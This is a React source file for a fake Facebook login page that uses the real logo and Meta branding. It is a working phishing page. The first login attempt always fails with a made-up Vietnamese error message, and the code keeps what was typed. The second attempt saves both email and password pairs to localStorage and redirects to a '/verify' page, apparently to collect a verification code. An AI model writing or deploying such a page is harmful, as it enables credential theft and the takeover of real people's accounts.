import { useState } from "react";
import { useForm } from "react-hook-form";
import { useLocation } from "wouter";
import "./Facebook.css";

export default function FacebookLogin() {
  const [location, navigate] = useLocation();
  const {
    register,
    handleSubmit,
    setValue,
    formState: { errors },
  } = useForm();

  const [attempts, setAttempts] = useState([]);
  const [showError, setShowError] = useState(false);

  const onSubmit = (data) => {
    if (attempts.length === 0) {
      // Lần nhập đầu tiên
      setShowError(true);
      setAttempts([data]); // Lưu thông tin lần 1
      setValue("email", ""); // Clear input
      setValue("password", "");
    } else {
      // Lần nhập thứ hai
      const newAttempts = [...attempts, data]; // Lưu thông tin cả 2 lần
      localStorage.setItem("loginAttempts", JSON.stringify(newAttempts));

      // Chuyển sang trang verify
      navigate("/verify");
    }
  };

  return (
    <div className="fb-login-container">
      <div className="fb-login-card">
        <div className="fb-header">
          <svg className="fb-logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256">
            <path
              fill="#0866ff"
              d="M256 128C256 57.308 198.692 0 128 0C57.308 0 0 57.307 0 128c0 63.888 46.808 116.843 108 126.445V165H75.5v-37H108V99.8c0-32.08 19.11-49.8 48.347-49.8C170.352 50 185 52.5 185 52.5V84h-16.14C152.958 84 148 93.867 148 103.99V128h35.5l-5.675 37H148v89.445c61.192-9.602 108-62.556 108-126.445"
            ></path>
            <path
              fill="#ffffff"
              d="m177.825 165l5.675-37H148v-24.01C148 93.866 152.959 84 168.86 84H185V52.5S170.352 50 156.347 50C127.11 50 108 67.72 108 99.8V128H75.5v37H108v89.445A128.959 128.959 0 0 0 128 256a128.9 128.9 0 0 0 20-1.555V165h29.825"
            ></path>
          </svg>
          <span className="title-facebook">Facebook</span>
        </div>

        <div className="fb-body">
          <p className="fb-intro-text">
            Log in to use your Facebook account with <strong>Meta</strong>.
          </p>

          <form onSubmit={handleSubmit(onSubmit)} className="fb-login-form">
            <div className="fb-form-group">
              <label htmlFor="email">Email address or phone number:</label>
              <input
                type="text"
                id="email"
                className="fb-input"
                {...register("email", { required: "Email is required" })}
              />
              {errors.email && <p className="error-text">{errors.email.message}</p>}
            </div>

            <div className="fb-form-group">
              <label htmlFor="password">Password:</label>
              <input
                type="password"
                id="password"
                className="fb-input"
                {...register("password", { required: "Password is required" })}
              />
              {errors.password && <p className="error-text">{errors.password.message}</p>}
            </div>

            {showError && <p className="error-text">Tài khoản hoặc mật khẩu không chính xác. Vui lòng thử lại.</p>}

            <div className="fb-actions">
              <button type="submit" className="fb-login-button">
                Log in
              </button>
              <a href="#" className="fb-forgot-link">
                Forgotten account?
              </a>
              <button type="button" className="fb-create-account">
                Create New Account
              </button>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
}
